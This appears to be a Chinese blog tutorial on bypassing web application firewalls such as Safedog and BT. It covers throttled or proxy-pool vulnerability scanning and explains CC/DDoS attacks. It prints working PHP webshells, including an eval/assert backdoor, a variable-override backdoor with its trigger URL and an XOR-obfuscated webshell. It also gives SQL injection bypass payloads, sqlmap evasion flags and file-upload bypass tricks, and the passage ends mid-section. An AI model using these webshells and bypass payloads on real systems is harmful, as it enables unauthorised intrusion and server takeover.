![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQS3HTXFsGFc5fcicG3zxbdtvwPMutg1Q7Bj50Gl6ibVviarV2BIDx4MNNg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以看到BT拦截了代理IP，并不拦截攻击机。所以并不怕封IP。此时还可以继续对目标网站进行扫描

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQkO2sice0gd1QXro89E2PkmEtM01U2gXHbTkbWLfnFahtibicbAxJs3kHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



速度上面没有任何问题，接下来看漏扫工具

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQGld2DULrqhvgqPywkOt3UT44uACfkXhTCLmFBswQJWsLxuHWI8LKYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



先在本地对安全狗进行绕过不对awvs做任何配置，直接开扫

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQO8LTLma2jy9UNn3bghJicxiaL6oxibxRYVRaHZbIlqEneUBt6rmibbUiciag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在网站可以正常访问

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQnKbkVhr7YSTvIWDiaqhQY6Siaw5K1g94v31WqWpBWuibSKmH5MSBiaqwTA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



安全狗进行了拦截

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQUFmdvbMFWgT6fTsYvEDB6ibEQMedtIpg9pIwXaUnAc7pXMypzG7QiaKw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用burp suite进行代理转发并且查看数据包。可以看到扫描器所产生的请求数据包是很多的

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQaKfo4ITq4DywKQc2l5Ct1LGmnUIkqyFxSX69icmRvtCIt6v1qQDZeqA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在将扫描速度改为慢，继续进行扫描，看安全狗会不会进行拦截。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQZFhE1H1tpLq93ibPMH4Ww5iaxutpOA0BgIcHpDbM3AxTS6vYwgWXzPXQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



此时的数据包请求就很慢，1两秒钟再请求，此时安全狗就不会拦截，漏洞还在探针，时间会长一些。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQjwPkfrnAPAPejuw8GVYlFtAgMvIo7p0fIDFWF23T5XicTh8CuSE74UQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在采用模仿爬虫引擎进行探针，扫描速度设置为快

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQxm4EDaHiaXCG82mN6aufZZrjrrEsm5X77QcZkHS2PPVJq0cMfuict66w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



现在发现速度快也不会被拦截，漏洞正常扫描，网站不会被拦截。修改UA头只针对安全狗。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQS2NYQDMzfey0rrGp4MYoyPoW46MJCPeh2RJWnHvdWv2sDaSSQX6krg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**所以针对安全狗采用延时和白名单**

  (Xray可以扫描BT，原因是BT没有集成它的指纹)



数据变异

注入点and 1=1 awvs注入 拦截 判断点失效or 1=1 Xray注入xor 1=1 appscan注入



当扫描器的测试语句触发WAF规则后，该工具就可能会跑不出漏洞。每个工具的验证漏洞的方式不一样所以测试的时候需要多款工具。并不是所有工具都可以控制速度，这就需要burpsuite作为中转来控制速度

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ1UXXeuLZfjffic7HpIYIWJXRh6X38hDXfKXtaFvpyxIxSbpD1njg70Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQtJOfOXlNFntibNa61GR2xYicvyD3gNNpnsYJKbMHBZs539GKSBkKqTiaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用人工的方式不停的放包，但这样比较繁琐，可以使用按键精灵来放包。 

速度问题是首要解决问题，然后是工具的指纹。使用工具组合扫描。

**awvs+xray****漏扫****Payload****绕过****-****延时白名单**burpsuite作为中转



awvs设置

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQI8ibw8DPoiblUC1dks3Y5jT49v5etlXasATa75KjqaibHIsrLv2WGjgDA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



Xray设置：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQuHOUicmJwGk5QVSiaPqwevPBNMC9KJ7yfeibuVdT7CxricyicBSZGSayyGg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



burpsuite设置：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQPZN44L77niaYFKlOlricUOQvZ0iaN5Bs7E1aMe5q7Pdyv9DtuCO5zRKGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQMUg0QIeLplzUTUtvtfw5osYlUpvU3PcSIkD1R1xuYWwlOZibWico0ibuA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



或是使用代理池进行漏洞扫描

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQOX02Vs29HDNvaiarkmshgw4nE7AIkCBpDBrHWFt9E81ibLQbZnvoeBMQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQb3uuS2YeZwYVZD2C7WLzDmHh30PEhfkrTGp0k8FVyvHMRoiaBpzp7mA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQianvhYU3G1PUO5UgulW4JyU9mzt1lc3kQicLAUvuF0t2AmtHVv751sUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQKJwEibkibrrPOMZ23fkjgeoxVhH9OuT2ylAwiahktEohDceTEACBibGulg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



需要绕过安全狗，BT，阿里云的限制，所以过狗不好过啊



最终成功探测出漏洞。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQQ3wwc1oLjqpz6CzW2oJlqEISwYcIGibSM413g7liak1ibcOwAEcYia1y1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



测试环境：阿里云-BT(使用BT搭建网站，默认安装，不包含插件)-安全狗Apache版（搭建的源码为pikaqiu靶场）代理池采用：每次请求转发换一个新的代理IP



代理池网站：https://www.kuaidaili.com/pricing/

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQick1Z96UzeyxYstv0OWrnPWXQuXGxk8RxhOJEJSJ0yIBtV0gicmGfjlg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQpicfuodEVypJiavOy5icl4EP5EYLxzfYrqic0EsbUKeC95AfRj7e0nLzFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQIqcpjXxTA23TibmmdvdCXbVrSvMibxDBM1ic7eIYWhPWWm8IBrAj8GGYw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**目标两个：**

**1****、使用****AWVS+****代理池的方式扫描目标网站****代理池**



**网站设置：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ4qvfZ8jdrO4Lc6JePrEUfpIIxOVFe7w4ic9aIst3Ek8bnFdIBd1waAA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQRckDmlooz2aFO0jKiaFsuyaeuPa6PYs0aoEldSYfNickV3rLEffMOrRA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



开扫前正常访问：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQvHZTdRN338OOdAmQpMjycWAUc1VxA0LbibLJPagPD9LN4rEFXmRicUlw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



扫描结果：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQiahicnWibUzWunoPbHspM3vYQegW9Q9zonABQict0iaQ3zialhiaphZ5dffnQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQxwU8z9r01jvcGCaoicXibBTNXqozZYDgTunHIdvgEBuTJjObD60MJ0vQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQwgSmCibnbSNHqH98ADSmUjhWds1bX3Yq7Pq8XzOjFNDqTvzkiaia6HSoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



马上要扫描成功的时候被封了本地IP.............

经过排查后发现原因：**设置完应该保存一下配置，再开始扫描**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQzzx8FzDwvWSxuEwy75pFEH10XZWh51ex0polgYcBkUxLjvqg1XyAxA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQxUib6NHjXzwnwiaebGckgah5bJQqYiaXia10R0BooC952ics4BlqTr7oS6g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



再次测试成功扫描网站：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQzwtDzjYktIMuqefJuhI3VQxRafib2F3CGS7bVjnfhyJWSQqTGP87yhA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



2、使用AWVS+burpsuite+Xray组合进行对目标网站的漏洞扫描

Xray配置：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQdQAsn7AAamDZWJ07SLebzfl4Y6JKYkPylMhUiaKAJNEdBEDZebh9ibwQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



AWVS配置：更改UA头，扫描速度为慢

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQVqJdmG8H7uviaaAkWm5q9jFa9DJXoiagAHicqEyCCby7Z4ZEqiaOMib49VQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)


Burpsuite和Xray联动：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQxicdGSz4NjuWNCNS1VeW8f0gMkr0o0Cv2rgU7GYGJFZSAKl4bL1QkbQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



Xray成功收到数据包，开始探测：

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQmsBp5soSazcJy415HZ71sVOHxjfGC2AibAK98xiawYQrLiaMKBC38VToQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQKKNMYocic1tIH3KIh76H85icNp4gZeK2vEsDm5KXgJWWRY9DIjOpeicMA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

***\*
\****

***\*CC 攻击与 DDOS\**** 

CC 攻击就是 DDOS 攻击的一种攻击类型。CC 攻击是它的一种攻击方式。 



CC 攻击模拟多个用户(多少线程就是多少用户)不停地进行访问(访问那些需要大 量数据操作，就是需要大量 CPU 时间的页面).这一点用一个一般的性能测试软件 就可以做到大量模拟用户并发。CC 攻击的原理就是攻击者控制某些主机不停地 发大量数据包给对方服务器造成服务器资源耗尽，一直到宕机崩溃。 



dos 攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一 个或多个目标发动攻击，从而成倍地提高拒绝服务攻击的威力。ddos 的攻击方 式有很多种，最基本的 dos 攻击就是利用合理的服务请求来占用过多的服务资 源，从而使合法用户无法得到服务的响应。



ddos 攻击和 cc 攻击区别主要是针对对象的不同。是主要针对 IP 的攻击，而 CC 攻击的主要是网页。CC 攻击相对来说，攻击的危害不是毁灭性的，但是持续时 间长;而 ddos 攻击就是流量攻击，这种攻击的危害性较大，通过向目标服务器发 送大量数据包，耗尽其带宽，更难防御。



WAF 绕过-权限控制之代码混淆及行为造轮 子

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ1WA9fEZnia65KL8W3Jf7oUbibGicGiag4wkGYayeErH4iaY1V8AAao6v9Cg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**后门绕过** 

**①简单后门-无法绕过** 

**WAF** **PHP** **脚本为例****:** 

**<?php @eval($_POST['x']);** **?>** 

**<?php assert($_POST['x']);** **?>**

**
**

***\*简单后门只是用于简单的学习\**\**,\**\**而在真实环境中，该后门语句会\**\**被直\** \**接\** \**WAF\** \**所检测到\**\**，此时就需要我们进行简单的变换。\**\**注意：一般情况下多数用\** \**assert\** \**函数因为\** \**assert\** \**能写入变量执行，而\** \**eval\** \**却不行\****

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQddFkZX4Vn3gYUIRc3xEVja1TuXcz31DSh2MJI8nmia5r5EBULdSbeLg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**②变量覆盖** **思路：** 

**WAF** **检测不到****可变的变量****时，就会放行也就是无法检测到** **木马后门文件** 



**后门语句** 

**<?php**

  **$a = $_GET['x'];** 

  **$$a = $_GET['y'];** 

  **$b($_POST['z']);** 

**?>**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQOEPzWv5WOW7dLuia6tV5NmAd7PGVxal7Yv2AvVic0EhnUoU0CB9kia0DQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**利用：** 

**例如：后门文件为** **1.php** **则，在服务器上使用** **http://IP/1.php****?x=b&y=assert** **即可** **实现****因为这样赋值后****$a=b** **$$a=assert=$b** **所以直接变成了** **assert($_POST[‘z’]);**

**
**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQibJsktKI8VFzH4DRTkwP94HkQDXicBxDlq4icPqXLQofSqia36YB2KW4YA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)





**③加密传输** 

**思路：****后门直接调用** **system|phpinfo** **等敏感字段时会被** **BT** **所拦截，尤其是** **BT** **的** **WAF** **会拦截** **/\*** **字符的出现，在绕过时，就需要配合截断****(%00)****，去处理或者相关加密技术** **在上述调用** **phpinfo()** **时，是没开启** **BT** **的，之开启** **safedog** **模式，所以没有出现拦截，** **一旦开启了** **BT****，就会对特殊的关键词进行拦截** 

**下面便是** **BT** **拦截的相关字段**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQh0JQOnC9qGDG8iaaVv4RcLnuzr6mG9XKDxgD7LoQ7iaiaGATibN4gwbTmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**从而就衍生了加密的方式进行绕过，因为** **BT** **只对指定的字段进行加密，所以可以从加** **密方面进行字段上的绕过 如典型的可逆的** **base64** **编码**

**
**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQjibFXlJEib2OlvB1dC0PJCc6icR3q6qN5cibZduEcRhLplCaVicpQqFodFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ41Pta3Igic4lPas8KHH0B1ke2PLic00U01yuAhaa8AxxoqNENoFPyAVw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**利用：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQBcN2kxjODD1DZk3YSql86o97Lpwibfia63Qibhnticzoa9UwTkyS2H279A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQmm2Rd6CXYTlyRQPtzXUMhBLWiaj1phw0NvCuicR1kPJYnZVXt3VLYOgQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**注意：**在 BT 里是会变量进行关键词检测的，也就是如果在变量里出现 base64 字段就会 进行拦截，不过此时在这并没有在变量中调用 base64，而是后门文件中调用了，所以不拦 截。



**④****加密混淆** 

**思路：** **既然可以加密传输，就会有其它加密的方法，就有了加密混淆使得** **WAF** **软件无** **法检测到关键字段同样达到** **WAF** **的绕过** 

PHP 混淆加密脚本下载地址： https://github.com/djunny/enphp



**后门语句****:** 

**目标加密语句****:** <?phpassert(base64_decode($_POST['x'])); ?>

**通过命令混淆后如下****:** 

参考命令:D:\phpStudy\PHPTutorial\php\php-5.4.45\php.exe code_test.php

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ3NA9iapl9Vz4W35XdC2EP0J95rnpNbuSFDastOMn75oYdHYn4bEibicPw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**WAF** **依然绕过** **safedog**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQlKGk5kAOiay6URYnBicqEtBZOnicfgkpYhicfvcvG0TcWMCM8tiaR7J84icg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**利用****:**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ5icxOgxDrfZdZPxic8ovvM32HJm8ILVzdcKOZROiaP2fdexiamAQCYcnFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**⑤借用在线 API 接口实现加密混淆**

***\*思路\**\**:\** \**一旦上面的加密混淆过不了安全狗或者\** \**BT\** \**等其它防护工具时，可以借助网上在线\** \**API\** \**接口进行实现加密混淆\**** 

***\*网址：\** http://phpjiami.com/phpjiami.html**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQyOicicH9uCph5APsoLGkS5pm1McCFKDNJtv8wspKLIn52Cyly8S3MDdQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**⑥****异或加密 Webshell-venom** 

**思路：** 同样也是进行混淆代码，只是与前面两者不同，该方法利用的是异或加密，不断随机的产生 不同的代码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ6z2baoCw28SKV2qYwabGdickG42nL3tXuibrpsMrCwRH1wFVHyZj7TFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**生成代码如下：** <?php class CEKF{ function __destruct(){ $SPOE='gK$JP>'^"\x6\x38\x57\x2f\x22\x4a"; return @$SPOE("$this->ZDFP"); } }$cekf=new CEKF(); @$cekf->ZDFP=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST[' mr6']; ?>



**利用：** 

通过简单观察代码可以发现存在三目运算符，所以当存在 id=1 时，就会使用 base64_decode 解码操作，又因为有 WAF 的存在，不能直接传入敏感字段，所以在 mr6 就进行 base64 编码 形式

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQS2JPGuicPZWick8atdwtJ9Syricf0AdZPaSPxXSCONkWZsnLjiaiaG2ZNFA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**权限软件** 

**菜刀，蚁剑，冰蝎优缺点** 菜刀：未更新状态，无插件，单向加密传输 蚁剑：更新状态，有插件，拓展性强，单向加密传输 冰蝎：更新状态，未知插件，双向加密传输

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQXG9ghico3iaSI28ibeibIRFXKFF1gictQibPt52sc2t6RZepO2uR1e3uyudw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



单双向加密传输的区别： 双向加密传输就是发包之前已经加密了，并且从服务器传回来的数据也是加 密的，这样在安全狗这些 WAF 检测内容的时候就狠 nice。

**
**

**①****菜刀单向加密示例：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQIOrdtvxvAsmqrZt64lfd5KraRq2e9Z39zRvD8A7FqsfvaKCevbfIKg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

抓包分析菜刀执行操作时候的数据包，然后模拟提交，返回了目录列表。



**②****冰蝎双向加密示例：**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQJcGWOHk2qlqQwPweQ18x44QFvHJsdu3TKIIiaExgEqu5bL8nayViaaEQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



双向加密。从而达到 WAF 也无法检测响应的数据包从而检测到敏感字段而拦截， 是相对其他工具来说较好的。



**自己造轮子** 

因为像很多权限工具都被 WAF 所识别了相关特征（如菜刀、蚁剑、冰蝎等）， 会导致无法使用权限漏洞去控制相关内容，从而就需要我们通过写入相关函数从 而达到想要获取的目的



**# 显示当前目录下的内容：** **var_dump(scandir('.'));** 

想要获取当前目录下的内容（php 环境），就可以调用函数 scandir()并让它输出 使用 var_dump() 函数 

**scandir()** 函数返回指定目录中的文件和目录的数组 

**var_dump()**方法是判断一个变量的类型与长度,并输出变量的数值,如果变量 有值输的是变量的值并回返数据类型.此函数显示关于一个或多个表达式的结构 信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。



**下图使用的还是上面异或加密用的后门脚本**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQISB5x40EBkDDrnsruwcTmWMx5WgUPj7GXk2rOss7kUl5NuiahAH6IQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**# 写入文件** **file_put_contents()** 如：写入一个名为 helloworld.txt 文件内容为 worldhello，调用函数 **file_put_contents('helloworld.txt','worldhello');**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQHO6WRk01gnZEcP086wAEGeNdf5RhLSADiaBWY8cIdJcp4FWJLict53Dg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



WAF 绕过-漏洞利用之注入上传跨站等绕过

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQwIaYic8gBryZzDxX55yy92CkHEELjXYQ3mbsgB7S5RwqWnutH39iccqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



一、SQL 注入-WAF 绕过 手工注入绕过 

①敏感字符绕过 如 union，ordery by 等相关关键字 使用/**/ (注释)绕过 WAF 对敏感字段的查询如 database(); 如 database 后使用 database/**/

②联合绕过 %23 代表 # %0A 代表一个换行符 union %23a%0Aselect 1,2,3;%23 如：

①id=1%20union %23a%0Aselect 1,2,3;%23 

②id=1/**&id=-1%20 union%20 select%201,2,3%23*/ ③id=1%20union/*!44509select*/%201,2,3 （大于 4.4509 版 本运行） /*!x*/ 代表当 mysql 数据库版本大于 x 时, mysql 不再当作注 释，从而将其运行，这是 mysql 的特性



Sqlmap 工具绕过 

①绕过指纹识别 

需要伪装 UA（--user-agent="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"或者--random-agent）， 或者修改sqlmap下自带的sqlmap.conf 文件下的 agent 也可达到效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQia9HMecBYsTLuQSCdf7SdU6mRxYJxc0kulEibyWPeS1TWHyaKOJ1HUOQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**②绕过敏感字段识别** 

**用到自带模块（****--tamper=rdog.py** **）** 

**③绕过** **CC** **防护** 

**用上代理池（****--proxy=http:/IP:port****）**

**
**

***\*宝塔基础上绕过\**** 

***\*BTWAF\** \**会对\**\**/\*\**\**关键字进行拦截，所以在上述的基础上想绕过\** \**BT\** \**就需要使用截断\** \**技术，故在每个\**\**/\*\**\**前面加上\**\**%00\** \**即可绕过了\****

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQLOPmMWaoVZr0GWiboKbic7SicxHWfYk9pGXFNh2EB1PGojp9uY0q8ySJw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**
**

**截断条件** 

**1.** **PHP** **版本小于** **5.3.4** **2.** **php.ini** **中的** **magic_quotes_gpc** **设置为** **Off**

**
**

**magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有:post、** **get、cookie 过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据** **库语句因为特殊字符引起的污染而出现致命的错误**。



**二、文件上传-WAF 绕过** 

**①数据溢出** WAF 一般检测上传参数的位置，所以在上传参数构造垃圾数据使其溢出 垃圾数据写入的位置：最后以分号结尾 **箭头位置是填充垃圾数据用的，为了更加清楚，下图未添加垃圾数据**

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ2DYE81S1Er7AF9bj33DoDmPMb5pyF5pKkukOaUMGFHxJTRO4X35iclg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQ5zibIvINiaEBwzEvyniciaTw1O0g4VxSAmIopBcRUPWOFtZKlVVHacOVmQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**②符号变异** 就是在抓包中修改 filename 的值，将 filename 中的一个双引号去除 使得 waf 无法获取双引 号的内容，从而无法检测出执行文本，达到绕过的效果。利用的是双引号里的是一个字符串， 但是当我们把一个双引号去除后，就会变成了一个变量或其它值，从而不再变成一个字符串 被 WAF 所检测到

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQDOvW1P1gPdD9wZJbDYL8D43W4PcZiaianibERjBAGUdrdzxeuQ7lnricGQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**③分号绕过** 

由于分号代表一个语句的结束，所以当我们使用分号后，WAF 检测到的是 x.jpg 文件名，对 于后面的文件被忽略了也就没检测到，使得绕过了

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJicTEciaVqLaRQwzBnsw9MqUQgpcYB13VpPJfcZ7S2TQotTLiamVZuZfGLgnYZW1ll1CYcVhjqYmd52g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**④换行绕过** 

